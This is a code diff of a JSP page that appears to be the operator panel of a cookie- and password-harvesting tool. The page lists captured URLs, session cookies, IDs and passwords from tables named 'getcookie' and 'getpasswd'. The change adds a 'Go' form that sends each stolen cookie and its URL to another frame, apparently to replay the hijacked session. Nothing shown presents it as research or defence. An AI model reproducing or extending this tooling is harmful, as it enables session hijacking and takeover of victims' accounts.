@@ -11,23 +11,34 @@
 	if ( edate == null ) edate = "curdate()";
 %>
 
-<html>
-<head>
-<title>top_frame</title>
-<meta http-equiv="Content-Type" content="text/html; charset=euc-kr">
-</head>
-
+<script type="text/javascript">
+function myEnterFunction() {
+	eval(parent.downFrame.location='down_frame.jsp');
+    document.getElementById("demo2").innerHTML = x+=1;
+}
+</script>
 <script type="text/javascript">
     function showCookie() {
        eval(parent.downFrame.location='down_frame.jsp');
     }
 </script>
 
+
+<html>
+<head>
+<title>top_frame</title>
+<meta http-equiv="Content-Type" content="text/html; charset=euc-kr">
+<style type="text/css">
+body {	background-color: #FFFFCC; }
+td,th { color: #000000; }
+</style>
+</head>
+
 <body leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">
 
 	<font size="3">
 
-		<table style="width:100%" border="1" cellspacing="0" cellpadding="2"	bordercolor="#6699DD">
+		<table style="width:100%" border="1" cellspacing="0" cellpadding="4"	bordercolor="#6699DD">
 
 <%
 Class.forName("com.mysql.jdbc.Driver");
@@ -35,7 +46,7 @@ Connection conn = DriverManager.getConnection("jdbc:mysql://127.0.0.1:3306", "ro
 Statement stmt = conn.createStatement();
 ResultSet rs = null;
 int cnt = 0;
-String url = null;
+String url = null, cookie = null;
 String sql1 = "select url, cookie, cdate from ibory.getcookie";
 String sql2 = "select distinct url, id, passwd, cdate from ibory.getpasswd";
 
@@ -54,20 +65,27 @@ String sql2 = "select distinct url, id, passwd, cdate from ibory.getpasswd";
 		try {
 			rs = stmt.executeQuery(sql1);
 %>
-			<tr align="center" bgcolor="#99CCFF" height="20">
+			<tr align="center" bgcolor="#99CCFF" height="40px">
 				<td style="width:5%">SN</td>
-				<td style="width:20%">URL</td>
+				<td style="width:17%">URL</td>
+				<td style="width:3%">Go</td>				
 				<td style="width:60%">Cookie</td>
 				<td style="width:15%">Date</td>				
 			</tr>
 <%
 			while(rs.next()) { 
 				url = rs.getString("url");
+				cookie = rs.getString("cookie");
 %>
-				<tr align="center">
+				<tr align="center" onmouseenter="myEnterFunction(); bgcolor='#b0cdfc';" onmouseout="bgcolor='#ffffff'" height="35px">
 					<td><%= ++cnt %></td>
+					<form action="down_frame.jsp" target="downFrame">
 					<td align="left" style="max-width:150px; word-wrap: break-word;"><a href="<%= url %>"><%= url %></td>
-					<td align="left" onclick="showCookie()" style="max-width:400px; word-wrap: break-word; cursor:hand;"><%= rs.getString("cookie") %></td>
+					<input type="hidden" name="s_url" value="<%= url %>">
+					<input type="hidden" name="cookie" value="<%= cookie %>">
+					<td><input type="submit" value="Go"></td>
+					<td align="left" style="max-width:400px; word-wrap: break-word; cursor:hand;"><%= cookie %></td>
+					</form>
 					<td><%= rs.getString("cdate") %></td>
 				</tr>
 <%  		}
@@ -85,7 +103,7 @@ String sql2 = "select distinct url, id, passwd, cdate from ibory.getpasswd";
 		}
 	} else { // ID & Password %>		
 
-			<tr align="center" bgcolor="#99CCFF" height="25">
+			<tr align="center" bgcolor="#99CCFF" height="40px">
 				<td width="10%">SN</td>
 				<td width="40%,*">URL</td>
 				<td width="15%">ID</td>
@@ -99,7 +117,7 @@ String sql2 = "select distinct url, id, passwd, cdate from ibory.getpasswd";
 			while(rs.next()) { 
 				url = rs.getString("url");
 %>
-				<tr align="center">
+				<tr align="center" height="35px">
 					<td><%= ++cnt %></td>
 					<td align="left"><a href="<%= url %>"><%= url %></a></td>
 					<td><%= rs.getString("id") %></td>
